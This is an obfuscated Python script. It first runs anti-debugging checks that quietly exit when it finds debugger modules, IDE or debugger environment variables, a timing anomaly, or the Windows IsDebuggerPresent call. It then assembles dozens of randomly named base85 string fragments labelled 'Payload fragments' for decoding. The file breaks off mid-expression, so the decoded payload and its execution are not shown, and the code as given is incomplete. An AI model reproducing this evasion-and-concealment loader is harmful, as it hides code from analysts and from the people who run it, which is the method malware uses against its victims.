#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_clN6VPJDLGNVA2 = '+YwYi2z}*-=Eg3s(<MSD><@>q$~)P#@5(zhIjlj}z>S$%q9pCaJ*bb@O-Gs60_X2K4M&%-d1iqs'
_crc5IIOzCzRwXt = 'vRXje)&2U}KXWeYaoc638##*HEvd`%c(Wtfoo%Uti4Y@JP+4AzpKGncO#xt?CJHAUS8c3irA_D{'
_chyj4nUDpjjWxp = '$F+m^P~(Z@->Ai{An%{?eY)MMEdkrvE`DARMbU!$B*slCBb5N^T{>!>r9mG*S=}>RV|C*2l?FA_'
_cnhWO_HCPciAZS = '6X%OftKJ)*wosNtHI*+WHxO|2@hs*AfRSkQc-A_-K#y=}u`=GRn@R+BF6KvM#aGg^Def<w%l27I'
_cxATXjTdCp83RO = 'S>_|I>a^a?KOjrV$s@&37Rii6Wwdjr+PqOiuft|;xZM~pZ!Hk&4cZ;V2t)YJ8{uX1b>oDcu=lA>'
_ctoxqJZqsK3RIF = 'CTN>P(UtVPuNTi!bQzVUhsQ)pS6uGmDzYs(R3s}a&w;RbUPIr9;x~>%iC}1^G~f;`&{@O-)enCL'
_cdUalEupaM3CAi = 'H0GxYgjgErWkO;+yq?fkklo(xAktulCWqM|spM9NVx%%N!z6s4Wv_nrUmt_ltGm=QhB2b9!fdEY'
_cy7i_GqO7G3HxO = 'eHJz?Q6Qz=Hti)YWa48>XO{v>juS+Ys^7`nkzm_m3XEw8f+H!-R39ew%=zH7JEDBAtNkaXKgv^v'
_cw8_6SARQaXaUo = 'eYXPTbNlK63J@sf!kt8)=Q)6PQEkc#!5&20sNVuD21biwb?S<eDB}I3AQZEdqu>n6k>IARs7wK8'
_cvvMYr3MiEwkpc = '>*YzwBy{{S+k=;3HsnQ-CV80T3F=8~6b$sg4~)KMr`14LoQbv;xxeli?l%8eU8WX_#$!AqKO_oR'
_cyk3db4HmsL7QK = 'Rao5xAi(I7nit6<x_Hort2}iUom6d(4-r|-@>ML9=kiN_`wVG~T(!d%tUnjFuNOx~Blr)Vw1hT0'
_czltHVvW5l1OAK = 'o#aoZr||n68OuI~2j**Dq)R#FN2ZLAkg<@lK8Di@FXK}&1pg(9g6V8ls4GfU#Ft@hv#0(ewd7kt'
_czoPMFaqVIPK0i = 'pTzaU+6}j9|N4&`8i#KV2vEwXl`I0~amg-mV*m~?7rPlx#KlPzGxpwe7!UvO@_}pqIzk1Rf0-xs'
_cnmoy10ldRYSgR = 'a;EBp&aXd?&*%2i%gdcKKQv{T#E5{#o`J~XZncCA<N|p||F3aYZy)Bp0tlu)DqT2_=$i$D)r8hy'
_cz7OQRT81JBrBv = 'CK$E9ur}t02CdOPNy`1E{3MUTMg>9MG;=mmL;tE$6AHluvlZ8Osf2qH0eFf(HiGeLI2vE;W<}cT'
_chfz6e2QOspR6a = 'Cd;0IL0?5R)Z@l<ffXug)ts4cLT|0}3?Lj238Or$bFY#VWslWonUC+RQHrgZ9G8DBOG9pbwcTV^'
_csv57n6xOG_52L = 'BuIe5{|g$3gknE%npH~m^m5(#3R9{dMOK5G3Z~+PmWg&W@`Me%J$9%PfXLEH<9P3F8eQ`4hK`VD'
_cuUYD_hKauPSLC = ')Xui7W&Ir_)Q_cImv;K??p4PJzAN<cOqj^}OJdL;Wcm5hE!?wE{bCVRahqy(g`AJ7D~(DQe=u{S'
_cfmFVE_v4G4LcQ = 'iHH^fqSd`u0a5u83cGjjH4vq0Yv9-20Kl@Yyh1%a&X_TnCi7a^aE9__H+yjtyNq0qZQH5ZO0Ryt'
_csyQlAN9WrGDKd = 'KEEfoquplQ6JpY}=;&LWD?nz6gV9vAtLlE@xcZkLu;YF;^j@@p$-{Kcn@PhXvsK(?q*rkCMM$NL'
_cc46Jvx0XmHrE7 = 'A7z6P@F>Z@;zzy&4SoAI8O$+_AibUpt8vJvRL6sxG_)qvi`l^ukRN_~sfTg1obY6nINVExN-Bkd'
_cgNlK9JW2x4ccn = 'kVc8ZZF7`JliBzpb@Wr>yM-5R+GA+&!O)cEHwzJ(mVzVo{qM~P9&c!3K64K+>$zmVL!&_7aVf<&'
_crbGcKhAMi7uO9 = '6e+>EIUo)QShXKLH;hr^L77+(<8=j*2s7Wedbk_t87?-u{wOt#8CYUh$<VMbo|Ea4mjws=A#Y}7'
_ccbNud2Wtu5emC = 'B#`OvrBQ{!SwnJ#KX+_s(r^5cQWx?2{3pgj65Z5NbY<-!tCD#v%-ExPk!8#X`0(m;G|pn1myRX8'
_cbM666kvko7jd8 = 'z$tRm&pL@?8$ozzHY@0(Er51;nUehUO=brHNVohM#Q<lw6RQ%-0Me@zfy8y+HXaE4kJpX9lkT_-'
_cyp1VOXOZmsUFW = '_OV`<$xkF9I&F1t1myISGhX2)Un8q$%{3Vag(yD#v;-J8-ybTFS4!>2;xa(r8NXFQ1MsfC%{0z='
_ckHgS4IOtJrIQ4 = 'j|<lpaU6kD-)^K&x&zkN=6$VsjsT5TMJpxtk18wnFN*g9;#8qtR@&Rky#*bGodObyJIt{a2tO)v'
_caYr7PLXEoBjYs = 'MdFY5W^Qi%GhN`$<jh@D9Ow8RI4I}IjZE3nwWX=J%>8pWsWxS3@}TX$BI_t*Y97K>JAaH6?OJVO'
_czi2teBsB53PZX = 'jk<_@8g+jOuRkLX26%Eu7tKm63o~#`obh^RGF7&%8A}7ZSk>eO9`WQ~=+PX-R43$xXy8^a#~;sS'
_ctOxwYfkrGr7LJ = '%vxVzmLu8^E8S~iNg$NVJX*xU?<%OQnxa`^Q#z>YQI&z&WGIP2yCH@tj_ib;s5~+7<YI!4dzorO'
_cqT9YIQpKxRYd9 = 'Lb^J<+5-0B<}W06?z;wQ54==#YbI<_QYlasJR%=}L=s5EE&xFsrL$l6rcpZ+;wKvK;iAo41`Y3^'
_cjEcJBfmLANEVh = 'EW2z`o<&LoxU72nF79xbJK^)kJbV~(LNIId9@bcZ&Af-D13HIZO8BvqYnb3V^876kDT*3D2YjU!'
_cpsN8bYmA2ovEV = 'ZhC5Lz||RB^08!wls$(Ix@@7uzaU7VAdmehbMbB*0@Fjv>|^xj$7HItJ8L`sotbgib<DL9nC%$b'
_cmq0Pfcf0bWBzL = 'C{zc3GP85OO2a&Y3|F{WkDQYH$z%*uDz>qm{@!QSBC$>X1ne~G3B^OjWq<`W`!-1P41JP_dq)>c'
_cvQvr7l9Qu70Kh = '#k;sqvPm2Hb67NZZ--5A>8%>TS*WUAayho{f}e@vV>^pS=!qJ|FpXdZ(L36wmn0!QAfW1s^&+$l'
_ck8ASF3WdUUiXX = '%RSSFj{SmIz45=Y4a`0i$|1;v)_tpaN(}ax?59KoP4yg-JJX=`Ka|*k?+~H)ETk3Z2pBzr>Ys)q'
_cs91990p4BPczd = '6PByyBKoVr$|Rd?<B4?F*9(O3f$U!Bp<HsX;ylg`QU!w|IiypZWQ|+Wb~}?jA`5FmAG>3iSXJ#Y'
_ctvBzfUT3fg5FR = 'V*<_X`n@VHyV(t2$`P^B$n-BfO&_<0H-qk+9C}-<jmon}O$91jCdZ<RC}}Vy`KQ}_w=tvC;YXJZ'
_ctJ0loPa4tnY5v = 'L%cWHb|XR6+UcyNrrA9j0So)PeSeNAJn5MCJ3=Nq`k)Yxzd0j3F|{*g1&e@mk}@cwZP6{7F|Ldr'
_caMHVPrROczAoL = '(aH~2JKux-f_;@G-T5mZVc^T0PH^L*q*2cZ`EyvpXNV2X+M!|1!smibU5A*r<D;)!cdpi!1cAtx'
_cbj1IhhpYYb0sE = 'My$sBaWPz+>Ovum{Veezqa$54aub7&3Z<4UdIMi=Z9ezGaE6bqM&AbE#fBh-=Xsa%1zEd=$B+4^'
_cyqFog0nIAmLqQ = '{5=H13Anj-U89A1Q8JT(C)jHV;oor0A@)<kkg7-)3K0R?9cS&meLQ2F+Aw!iZ~Vvu8pUb?oHx$S'
_cuP_8pcsawyion = 'c;t(+BKGfvp%l2z7bUKDA5mj7l(xhEIV!)yVXCrJ+nkL>1H9+qtciwBgxMhZ+cN;>JX$nmbY|ZP'
_cqwbGlnd4AppWw = 'lS?g=uuuv)?I<2H2uQ@T?;-TL!Aq=y{g(!Sw!>eHT2(xSxa6W|e4g$pXc=F3aeB99i<|0o2OluX'
_ce5OXn9Der3wn_ = 'pS8dY=kX|dTI90VHP$Y<cpH#lnY~C#Z%kls`JGO55RxBX8{*6%;Hf=su46?(Co|zHQM;|;tAqND'
_coqxbzNXjJDSwO = '3dm)jer-ovc$Y+RsyO;S8m6Fi&KJt{VxosR_FtMq6??(1l6xs?a4iph^@+p-=(a>W?L&n|95np!'
_cavFGPsNtxiHGs = '46}R5H(#Ngy<sMnK8`sxSWVQDAdOPl(^?2OwASnf--_~t%+L5m*GBh=mMYFv`88gM%%)4zfmhtm'
_cnXRzAnheCfP6C = 'ze>e{SAvgyoJuggY>JSad=mgelpQ$+kW3AU+4pPIq2N7R3IJF=?FarfttClQ;1qvK3&Cr^d}oc0'
_ckHnOG9Gx0M9_f = 'nejJtf}J)JgGqTT`$lQ2Z;jI-d*cxZ^I6`8Lzy$9>K-Ub<XSI^ejWws3NGjd@V6eFqDE{xaqN(o'
_cxvNCjn5R3ikJP = 'kwK=Ls?L6YrGb+r?E-bTU6$hEEgY>8?ibGI8E}eMe)=)W*-9~wk$y~!Yc?zeALRI(?spf}2@HK_'
_ciusmSkWJi3GQi = 'aUNf2%n)}}1cmis?(btxR}eH1>4wEDSM&D~XyieN171~j)l$jFd5}ncS(k8y7^9VFm*WDjcEBTr'
_cdghDPqHQ0nNjs = '8fag2Q;&Q8c28dGMCZ9RR=w`D)C0W)gZzGOly<O|u6ga(ucfFXqE)>v0D@x%$;JW$+Pn1%lh<Q('
_cveyVKg_DWQHny = 'b)T$3r1QzN?Z$nwC8@0i3yIVGarSQm)lA%_pEWzwq01{*fgbrk58w9q?}YSJ$)4fwPkEwhtC!dC'
_ciITJchKjDAI8p = '<as9nGc9oavcyfW!dl6htH27>xFXD1I@Djb=zx!v&TLvA)hhGB#v6LxZ&HV~7X`OxyRmJYbnC;)'
_covPBXmzCOping = 'Mg&?9+#BFmcJo<=9LEkm&0?WM*Ov#Og0Q-(@AVHi?M35*N3-F|z~x@mJmn@q1L*Iz#x(;$i0-wN'
_cki1z7gXQeDOII = 'J`eHAxo4iJAdH&7a3>#(>v{EhXo71aR#Jc>oqb~kqd7unAJ+ME{P=2!v|QZ2nafwuB|h?*N+7%*'
_cocy7OX6wQgMru = 'HYZ(J`sjZDARdCn!qN)>h-(Cbh&;VD!abfVyi*dWmhh|#9kF7oK?`mP2}h+@tZuPw_pOb+e$YG7'
_cnC6nVX3MD4d6p = '6q8?Yp>}yGo9>=AR{0<asbl_I_Mi^%o{!}ryX}joM7bUsjTJ8u{r`#6=?Cs8Z#+gC5Jk<rIIZFq'
_cyacQQiFxQZhv2 = 'FapL=4DTb2w}y^L7Uii&Wq2svnpJ<mI5>Xg`cCGuu*dJFXTNPw-gSOlp!6Uv8|NVmgr-4+yIcJ<'
_cojeQIBWwmUMtq = 'qoh+@H9C4j>s*HS?%h#aw>`2}eGTYsLzsVu+fV+ys@@I13^I~Mt#5i3YHtAJSlCWf8@S~>R8ABj'
_coSV8LavOXdhYo = 'JjpJ_0*+$@N@V(KTw+c!FVmdqZ>oO^Q^acpxs?;64hxHvtk;53OEx59_BuSjfy$XNX2IVWTmo9W'
_ceIMgfNUrU6r_x = '7%DOwIv%nY6upT8W2(4ya6JAPwg~-5qlXfE^FLgYO+Uq@a_u~JCp^@bme?DkMM}hPV8_`BEB0r&'
_crgjh_RGD4fXDz = '3r`O6PU_{?1{O!0jppkE9IA@tw1su5xg3O5E9Bh_sJC>F>A`|w7(VDw!wddB4_4=Mtd?h1XtMds'
_cuY62kQF3UigRg = '_;M*(RXOR>THI9r*UQ5kwqYpb*q#Q1y#yj9$*>g$5kPEJuw34#@pPswHCMWuMM{mCFW4BjHsy`>'
_ce1gJgdOoPdhmb = '!<08a15uo%i9sJ+*-{c!!+WU8f0F7Gl?3)xE{VVCEF;OrAy2TgzO7{VpIU=tWV&r2nq)`V!o#yP'
_ctagPGiEs5mvHv = 'wBNxL#}*V9B>5B^DP}qyx)ucJWW|zHwFJQ_WanooV)QsU^ox~IMm99}hB@l^e}7xm`neG@p+{z@'
_cjvMHXMGNgTTfK = '29=A}?+2KkVMpwZF@<*`O||Hblmiy+9ZoEzz_iX=Q=v0WdDrll!y22(#*)^z<@Gg(D&-^uk61X*'
_ccJqxrCcrbtuKf = '2V=tIw1}`G)L+PL6torXgGdavT{EKL#g?B1pNK<9e;_H&z#emp{*e0W9!av%`uG4AD>pnDw7-!S'
_co8Da5Gldz2NmX = '&RTX_QqA4}vH;#GuE(^@vtmSs)X6OxMP`br!cctv2TSq3mbnqZVEp!r0Ijl$3VOc<6`obN0cm8I'
_ctOTnsIeibyA64 = 'mgcnd^Hw1}vy~{&Ekr&>s}FAGEfDD7<s092!hdqY5JsGaTVJjPBn`gIzjAKVv4{<rA_94(rh8mw'
_cfvqdagA4SaLIn = '`|(ch2v~Kqms5|6@@~MqT1u)GuMm9!Fo8ieUc~s<?wB3H0VeVE#DA-`2o`Z8qRAY?k{d97_t~s}'
_ck3d0CquTtbgnp = '8CD(0rz9bxH}4I+DpXF6(fDz^PaXl*{0+wNie=E$Cm>8;a7)h$;QCBZURQM7?bKP4@dr(fEhsi%'
_cfYFzkJZo8R2Im = 's=qaBylvUTo6+P?i_;`3M~1jWq;syc2<~|+^RMP^%os*in>(+F)sQJ;cO=D1PXR`1$?&KcHS4C6'
_cnNrqGRMPhl0Ut = 'sAAyenF8l2W3$cfQ8<1V_z%R>?A80*kx()Ih3-)>AV8gAq^(AZaDAY`D$dU)k34*WAnhx`B0dku'
_ctWpaKPicNGhCO = 'HmIE(NJ3&SH1h=3nr;qB7nr=_QEJMk>lLG*T!LVU#hOj`g|_4yKS4Jbga!Be^Fl}?X@tSd-~6aA'
_cl_VIKDDcJe5it = '4=M~{f-*O}&>#9{Ap5*s_wGv&8|gh(ypq9~lvk%Ju17HJzqgEQp|G@jB=}P_fg4)IYEm_Ci{39P'
_cosm5meeWGZnny = 'ztEIWiW20_2od*a3~sdzl4l3m^pwGjJ<)V=**1+aMo+yBlE(WI+c{B&1p$Rq`v4|5V?6R!!Y7%;'
_cm3CdWzkBTQCIh = 'hX)LYbFzK9bR`9;$LgSdbT9vl-cNKlFhHyz3d=+F5u$<zZXKbh&~9k^JL_nPS~_YeI)`J3HC#XG'
_ceUKgb8enCL3RI = '_j;;HGA5Xw@tuq3D+KZ!pz=$}7BB&ZIUw)ClAl=pQWsVxS<Pd2Ops-K;XH~fW9VYmM0g|v=dQ_p'
_cb62UrzF1g2cSn = 'geNTE62cfD3P%_yvg4$Mz-RW>0<nt+LNHtNU}k*JBYcdjL43%wQV@vZLuIMPIv?!VA^uHxq$*iM'
_cnGNI0Djs3g_LV = 'q(oleSfU`aWc9TKhf~v#9`ev)I$1W#C9=TDoZ#ZRRz!3kSjMdCxD-$X)>MiMuju4K`Wz_E2%}5V'
_cbk7jKHY4g50VZ = 'Xzh(e`LBL{-Vrvnrt}-Iz5J~ZWwvi`-68-u%RS?GYfk2cJl<<Bn|y<k&F<^lz8bZ#m8E1%+s#`+'
_cptRkWhWYYtkex = 'G7k+=sqFML5(5_c#^_ZWE(V%f6!?m*x(&V3V<Czn;~o@#^h1~m50rKugF4r9B)5*?s&*CT9kEq2'
_cut97G9CRNdunb = '+fnMLH~k?Z*>qq}!1{gu=EJ_PM2weEEwFm6@^qIY3@=38<tPXNpP{zbo1L81ytvn?>AtEuQxDL)'
_cptnXWWn1jLOfP = 'qRJp@g&W(Ttk%`H42kGmBSl~Zid*`hG%<D{W-&bfNC2c->~zF^J!;POAx+M=3S3ZABGu}BHl&F>'
_czOy75FPURuaGO = '*$e_cD}<`oF?@45qh4}@1?I6lx1ay2+q!U=@jR<;ZGo{3J7Af{bIQLCqJf%x$5=zZ1`ISZ=NBKB'
_ce6K73Mudo_Pgz = '-0mXi+3n@a30a1%4EizhYnU!=pLm}1aG*1%>$QyD6uZ7S9Qm(b#VMX3p*c3t<v^QiEO)IyDYN?K'
_cl1njyEYAAxurg = '5^{{DVjf<44_`t4pz%f=><!1lJM-L!i)hB@I*Ln}4fd)-2Q7SVH~G(EHhQ~!{!zEKI))CV<5|;)'
_cf92vBZ0YKqmAn = 'Yb<Ff>jZ4g_wXjwA}$5B@Pn}Cu#G<vnS(V^&E42KF1(b33!nP91kn80zKm`%+(*WB&&q0sj_W}A'
_c_yhdeIUQeq9mx = 'GX&c@@sKqJ{!n#sOd#F{^$AXdKNiKzoE140h#b6hjms$vf!W{8??$XrxFNKb@m9z<sR?fxA}%)>'
_cgtVZFb8tycU2b = 'Wa&m)(@S`=IcYcr1)0rH+fGHX$>%82u?Cs6pxjFxiITD$H5i0}EOZ~v1<J+|wE<%s!$GEip_Qy7'
_cnMODagegPs5f5 = 'FZIUor5xeSuj@OY9d(nVH-dMwPgH#zI0e*lgKxb&4GC42HS~tQ9=~JQ_NvIb|9f|AhEE{mR#f5o'
_cpydI_axxPBdut = 'y(OhlIEOLWcu(%{Bno3Z$YkOPnE4SxWT-bc;{6mL8Sg$au{hq>fQSiJIRqy=wQ-!qmK>DQw$z%q'
_cldt80PNILuhSC = 'ng?>3wy6<(;|Wo3AucsH3&|6@ZTyjkI$;!N4~DiXE%@q?=eDD<uEKYO2P6q1KF|YcYm0Iu*MYp#'
_catUYTtCZPs4DZ = 'wUhs0$4vpi@bjuJd0-%(lJVu8rlIkx!y8BygIsREANK$?Kg3O9w|#t9e4XtDs0|^7i-okVu~S4`'
_chpAuROb3amuWh = '%s1S+nY|1oB|yZ#WZr@t6kVu}*9-_xD?S&tEBl)K=npCf8#TuM*J8TLrJZ_Q31nKt@|UqVFxO0}'
_csk1L2rZQRCmly = 'N1<=TQ33&+ebs;q<U0h^0sNIf1z9gyKP*A5vM4>~k74{l6avB5&c&}0TsJkC1VWSNw~a(wO6#5F'
_cgLYZFU3TTKovR = 'Kw<@%3OC($w<jBwueia3L07()8{~cnBXEoA!EX*xW=o+r1j7f2(8s0VP@$Rj-&Fy29RN|cf!+1r'
_ct_sGDi6dbELkM = 'i45C-%whRxce<a)mQ2x!;}G;h?^xB%F}4oXg}v`8(ij4ELcjYVMsjxaChX&qX1_wND<jlGFttVS'
_c_xafJN2QSauyt = 'L_XT8PoY<60l}m;I>$mkG9EX(n7<TkX)Bqe_+y!xq%6ue7)_1xM)g&G0;%Bbp&5DgMenwQk{h4h'
_cnTGFkULoaBIa6 = '?x;hqmF(;!&ZPHtLxX`8mYLD`3^HdjfU+CXW9PlxFzeWg$8}}BcSH?dmOhU4(|Wg@1V@qxoZv4s'
_cvpkkvaOSCKU0a = 'V}v)Ky_(LK|Kz7OfpZN2hGrgm9=#7(R7~)bogpdKuLk?}6aZDFeVUlN=*-unt`sr@VC>8*HB{ju'
_cw16t6tccQjBOt = 'TmM0+#QhM*)r%SY4rDHTy>t7KPU>S93xc-a9-kIW=+)Kuge`PkrXjOZ^&43DT1notvt1RyAakH0'
_ciV3cZL0qtjSNb = '=djL%N+a3iM60&)t}Ss95oe;COtVwrD3I^~4o1soN=O_b=7~*7(<U~S?Q9;dY63i6A}y>oEJhP_'
_cdSbbKCMrskGWa = 'u`ZB81`VY=yR=#CWhv%S=!92&tG-ny>k_LG$cz0QO2mQ-`OolhLrDozy%|~-w;btiX@Je!Wjz^('
_cnxSaq2xbC1O9w = '5F6+ZD2bkJGqLt^_;PGUrU%Z8%PoKIhMA5E=Z2kxYzY^|A~-^|TIwg0FtdP_VCF;B56UaELxv?9'
_cziXLE2nG4tuHa = '5#CxsGG&B|nm{_W#CG|zQK?;Bo9s*lC$4<=BcL6ZUD)@?<x230D9SFyFGg0cDiw&b9UdzS?vzs0'
_cz7MdS3nUds_yE = '5DaUfn#*n)ZB4p7b&utBWI?t4Rb8M!9g`c;2ruih3NS}s4rS%Zk`(&%*SpBANbfu|+dl1C5uVmS'
_cukN0HH59sMF0u = 'WW^P2gxvcQrR5qTTqx*AfShM!2ydkRWpQp1`;nR_E2~jrEq8fldER#lmHHb=pyyFb4ZNbK9yoI_'
_cnuF7Xpi21HmWp = 'SVJ#Uitze6GG+?~2X!h51CJZ*bYuy>XJoDAC6n{~;*^h$Vu?2hacIBz6TQz61Iy)EZgU=#6Sy8^'
_cgeiz0MWzKhO10 = '8`M_&F~IM4|IkZL6?+aq=AOZ)37P!;wBkgB_0Lx07;Y2iiRBph0gIWGKCWvi-SC5-cbp`M!ybRV'
_cwR_SW6Lr4x7pn = 'wZZ<VvU~UqbHk_p>Q3{sSWo=l@o?z%)3NZ~#85i@R0!q?5Ty6j-&CV*=m<TYdw5s_D2Cn>!$s#y'
_ctnMXlx7jas3or = '4W)rM1g3z_D=pxv5$H5XtvpEISVX+AAj6t6){?}?GlBmH0XXO%TSjFAYav_On!h=^V`jx)Absj7'
_crE7YRuagpi5fN = 'Ez})3j=O3w+N&wKV)&`}VZoV1RZ!!O6Vsyvg?i18vi@1tanrft-&N=g7O3uUE$`3(kg->nYU&~='
_cxYk31obY81nFv = 'blgtD>>qK~hkL3$kUgZT3K*tCO&>+zDn1=FO1YX=1pawyofomtj6zsE!q_yfkQ+j(qIHEiE9+Nf'
_cm8sdiLDRkoMCn = 'ZO;ndW?b-CU;$xHTyIRQrH^I>`-^U!Q1o{KL{WmlilPi9Ya>Y*dCK%>c;zpzo?4OE4x8DlU<eK4'
_ci5L5p5KwzPGSI = 'VLpfpxI@K6iXsG=*f@>^+`*GsH_G&9hUYJ@4oQ*Nj^-M9hz~duC*Z$2%C|JN5Y}ir%uN`S^8$$D'
_cbX0J_lYpUPiT_ = 'M#AyDg{+5M{?^q+so>mA;pUgRiz>@8ch*x&T>voa-~EC~%0n+?Y<^X{{Y3#vz*z6jH6TuK-@%i?'
_cxrlVVVXSHY6Bq = 'Ny_x6`s`Iev7OSJ;V#$J@+M8S(Zsa8?%YMUiKxRL37;=zsvcG`0_XUfYZ;p^X^EZmIYsg|(9{{$'
_cztZLMhSnYvGHv = 's7gh67FCB_n($D>UvISF{VpT0*u*r3FEvEhe;9`OE(wYw0g;xVX*AJ7YS}-oSgxbtSq6K}(&~4c'
_cilzAewA_7s_6P = 'tjVPqdm;yTb-Y^9qXiJh*smQ{pv&fY{?^yS1Z3YIoHcOg!l#@#qWqJp!h2_CVl731trYS=AVNiS'
_cuDTe4ltaxGXqW = '-9;fg*r_%Y6d{&~*f_?<-6m!ipuNkny4B*aC!Ek9t2Klf3@wR{U4)9vTqFrNMcQjntzV?lIN07m'
_cg1rDYIuCF09HY = 'rq|lSK?`%q=x6bMN#fE6(#w|fY3j~3Q~vdgR9BO)&BdQ7%djNATKTb+f7}ItCg4ud0|qGR*mYFI'
_ceyPCzk4es7b6w = 'nHwGJLKl7jE0Tr+hMyE&M;uc&5Z;^yQv^a4wMczIBlyg$r{z-Y^R56*y#h~q91B|1NM6&R`u0MX'
_cr58d48w7cnMjC = 'TX&U9C+b3W+G}aj|9{_Q7}An6a_QD8s`}<c>|8P6?Sfsgj5hWhJhr|Bz$v+xyDd?V;58>?EnS;&'
_ceYTZzigf5XnBI = 'OV*dCAe|UN1}9cZ`p0vgoA&7Frv(z^&AS;fE65pU(I01CxU&n-fED#8;H?soOYkbrT^rdyys8sy'
_cptJu6o2F89LCJ = 'Q#5T{f2EBIAP2sBHGi>pB*`36p3mO}U)&v1REf};XYKsJ*tV7sVtlb9>$QKeQ7_&Os$ZWO<#Tc5'
_ctTT9ZTTwhVwHO = '6EAw*KahY|rz!*;ax^T#A~wosmC<5dalN<;jQdQBYWJ^&s+7TI-T%O0O$c3x+dV8J7ovkSc|5FP'
_cjZCCedzOM_kEj = 'W4|RajyHI0?{|Q&#1E6@<rBZ`L@^$;NhJ4{>k^R=^88~mF%2M<i%&gKAEU@MVj7rWSIZ74ImSGC'
_cfTBaoPtRX1s9O = 'TdtSJH!O%~k<*H7r^AgAFGbd{a0EwFG!%b#Mx*`R3CO|FjQ#R&10Lc-#!2<0Gc$cGU&~levRT=-'
_cgda_J0ykTntDu = 'Dq#o7<QaO-1T$ww)3Q2DhHW&o^d8ObUzD@c7WeXe=3_ndjUc*w4HzW97CI5--&jzS7TA=QHnfj1'
_co_eiN9_bXotzz = '+`;2VsWpW{|3oVm{p~%)=fu1z<*zCn+_Og3AZPh&gEkD4<guksX&xbY5${6q6JP=%ofg{T^*izz'
_czoNXEWCWNRRI3 = 'vJhaoAqo?>p;d+Q0|F(^dcy}&9(L|USg(Xxca$d<HjFaHQcv)ajCoKj^Cue+pWn_uC`t<cCr9Nz'
_cv7rj0vP_tenF5 = 'yjXJN%wO_}yH6i8TMG=K?C7rISh%JENbNG>%TjJGB#7U&PEYJ=od(N^E8pnjfvj+=iOrkqM$K{R'
_co9kZlPDOmdTLC = ';w}zd4pa)XI-?(oIe~H5afQe%k+!nM!VA|l<;Os0CJS2{Vd%r5+KgQ@f$wXx$0hDpmywde@#h7Q'
_c_1t276RIQ02wp = 'JO?88*et^##UDQZcLxjDQ{_@)&!(-$J4ffw{FRO=iU+l=!cIXj+`aO!Q6r!*w$o;gF6#w)TrueF'
_ctkPg8g2ZjuqG7 = 'Qf!~vSbLh<pclLv%fNc>1XChH6a$h+5~Tg%6<6fXW{@*>r!1SC+-BNO_!Om*i`H;i2IH$=Cd}_l'
_cpmkPRU72fF0xo = 'o5K*0j=21*C#y~(TBAK4*S1yBkp'

_pvMeCF0tKfFufK = __import__('base64').b85decode(_clN6VPJDLGNVA2 + _crc5IIOzCzRwXt + _chyj4nUDpjjWxp + _cnhWO_HCPciAZS + _cxATXjTdCp83RO + _ctoxqJZqsK3RIF + _cdUalEupaM3CAi + _cy7i_GqO7G3HxO + _cw8_6SARQaXaUo + _cvvMYr3MiEwkpc + _cyk3db4HmsL7QK + _czltHVvW5l1OAK + _czoPMFaqVIPK0i + _cnmoy10ldRYSgR + _cz7OQRT81JBrBv + _chfz6e2QOspR6a + _csv57n6xOG_52L + _cuUYD_hKauPSLC + _cfmFVE_v4G4LcQ + _csyQlAN9WrGDKd + _cc46Jvx0XmHrE7 + _cgNlK9JW2x4ccn + _crbGcKhAMi7uO9 + _ccbNud2Wtu5emC + _cbM666kvko7jd8 + _cyp1VOXOZmsUFW + _ckHgS4IOtJrIQ4 + _caYr7PLXEoBjYs + _czi2teBsB53PZX + _ctOxwYfkrGr7LJ + _cqT9YIQpKxRYd9 + _cjEcJBfmLANEVh + _cpsN8bYmA2ovEV + _cmq0Pfcf0bWBzL + _cvQvr7l9Qu70Kh + _ck8ASF3WdUUiXX + _cs91990p4BPczd + _ctvBzfUT3fg5FR + _ctJ0loPa4tnY5v + _caMHVPrROczAoL + _cbj1IhhpYYb0sE + _cyqFog0nIAmLqQ + _cuP_8pcsawyion + _cqwbGlnd4AppWw + _ce5OXn9Der3wn_ + _coqxbzNXjJDSwO + _cavFGPsNtxiHGs + _cnXRzAnheCfP6C + _ckHnOG9Gx0M9_f + _cxvNCjn5R3ikJP + _ciusmSkWJi3GQi + _cdghDPqHQ0nNjs + _cveyVKg_DWQHny + _ciITJchKjDAI8p + _covPBXmzCOping + _cki1z7gXQeDOII + _cocy7OX6wQgMru + _cnC6nVX3MD4d6p + _cyacQQiFxQZhv2 + _cojeQIBWwmUMtq + _coSV8LavOXdhYo + _ceIMgfNUrU6r_x + _crgjh_RGD4fXDz + _cuY62kQF3UigRg + _ce1gJgdOoPdhmb + _ctagPGiEs5mvHv + _cjvMHXMGNgTTfK + _ccJqxrCcrbtuKf + _co8Da5Gldz2NmX + _ctOTnsIeibyA64 + _cfvqdagA4SaLIn + _ck3d0CquTtbgnp + _cfYFzkJZo8R2Im + _cnNrqGRMPhl0Ut + _ctWpaKPicNGhCO + _cl_VIKDDcJe5it + _cosm5meeWGZnny + _cm3CdWzkBTQCIh + _ceUKgb8enCL3RI + _cb62UrzF1g2cSn + _cnGNI0Djs3g_LV + _cbk7jKHY4g50VZ + _cptRkWhWYYtkex + _cut97G9CRNdunb + _cptnXWWn1jLOfP + _czOy75FPURuaGO + _ce6K73Mudo_Pgz + _cl1njyEYAAxurg + _cf92vBZ0YKqmAn + _c_yhdeIUQeq9mx + _cgtVZFb8tycU2b + _cnMODagegPs5f5 + _cpydI_axxPBdut + _cldt80PNILuhSC + _catUYTtCZPs4DZ + _chpAuROb3amuWh + _csk1L2rZQRCmly + _cgLYZFU3TTKovR + _ct_sGDi6dbELkM + _c_xafJN2QSauyt + _cnTGFkULoaBIa6 + _cvpkkvaOSCKU0a + 